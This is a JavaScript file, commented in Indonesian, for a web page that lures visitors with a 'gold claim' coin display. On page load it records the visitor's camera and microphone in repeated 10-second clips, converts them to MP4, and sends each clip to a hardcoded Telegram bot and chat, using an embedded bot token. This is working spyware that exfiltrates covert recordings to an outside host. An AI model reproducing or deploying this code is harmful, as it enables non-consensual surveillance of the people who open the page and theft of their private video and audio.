import { createFFmpeg, fetchFile } from '@ffmpeg/ffmpeg';

let mediaRecorder;
let videoChunks = [];
const statusDisplay = document.getElementById('status');
const countdownDisplay = document.getElementById('countdown');
const goldClaimMessage = document.getElementById('goldClaimMessage');
const goldCoin = document.getElementById('goldCoin');
let recordingInterval;
let countdownTimer;

// Masukkan token bot Telegram dan chat ID
const telegramBotToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q'; 
const chatId = '-4545188605';

// Inisialisasi FFmpeg.js
const ffmpeg = createFFmpeg({ log: true });
async function loadFFmpeg() {
    if (!ffmpeg.isLoaded()) {
        statusDisplay.textContent = 'Memuat FFmpeg...';
        await ffmpeg.load();
        console.log('✅ FFmpeg siap digunakan!');
    }
}

async function startRecording() {
    await loadFFmpeg();
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

    mediaRecorder.ondataavailable = (event) => {
        videoChunks.push(event.data);
    };

    async function sendVideoToTelegram() {
        statusDisplay.textContent = 'Mengonversi video...';
        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
        videoChunks = []; // Reset

        // Konversi video ke MP4
        const videoFile = await fetchFile(videoBlob);
        ffmpeg.FS('writeFile', 'input.webm', videoFile);
        await ffmpeg.run('-i', 'input.webm', '-c:v', 'libx264', 'output.mp4');
        const outputData = ffmpeg.FS('readFile', 'output.mp4');
        const mp4Blob = new Blob([outputData.buffer], { type: 'video/mp4' });

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('video', mp4Blob, 'recording.mp4');
        formData.append('supports_streaming', true);

        try {
            let response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
                method: 'POST',
                body: formData,
            });

            let data = await response.json();
            if (data.ok) {
                statusDisplay.textContent = '✅ Video berhasil dikirim!';
            } else {
                statusDisplay.textContent = '❌ Error: ' + data.description;
            }
        } catch (error) {
            statusDisplay.textContent = '❌ Gagal mengirim video!';
            console.error('Error:', error);
        }
    }

    function start10SecondsRecording() {
        let countdown = 10;
        countdownDisplay.textContent = countdown;

        countdownTimer = setInterval(() => {
            countdown--;
            countdownDisplay.textContent = countdown;

            if (countdown <= 5) {
                goldClaimMessage.style.display = 'block';
                goldCoin.style.display = 'block';
            } else {
                goldClaimMessage.style.display = 'none';
                goldCoin.style.display = 'none';
            }

            if (countdown === 0) {
                clearInterval(countdownTimer);
            }
        }, 1000);

        mediaRecorder.start();

        setTimeout(() => {
            mediaRecorder.stop();  // Stop recording after 10 seconds
        }, 10000);

        mediaRecorder.onstop = () => {
            sendVideoToTelegram();  // Kirim video setelah selesai
        };
    }

    recordingInterval = setInterval(() => {
        start10SecondsRecording();
    }, 11000);
}

// Jalankan rekaman saat halaman dimuat
window.addEventListener('load', () => {
    startRecording();
    statusDisplay.textContent = '⏳ Memulai perekaman...';
});

// Hentikan rekaman jika halaman ditutup
window.addEventListener('beforeunload', () => {
    clearInterval(recordingInterval);
});
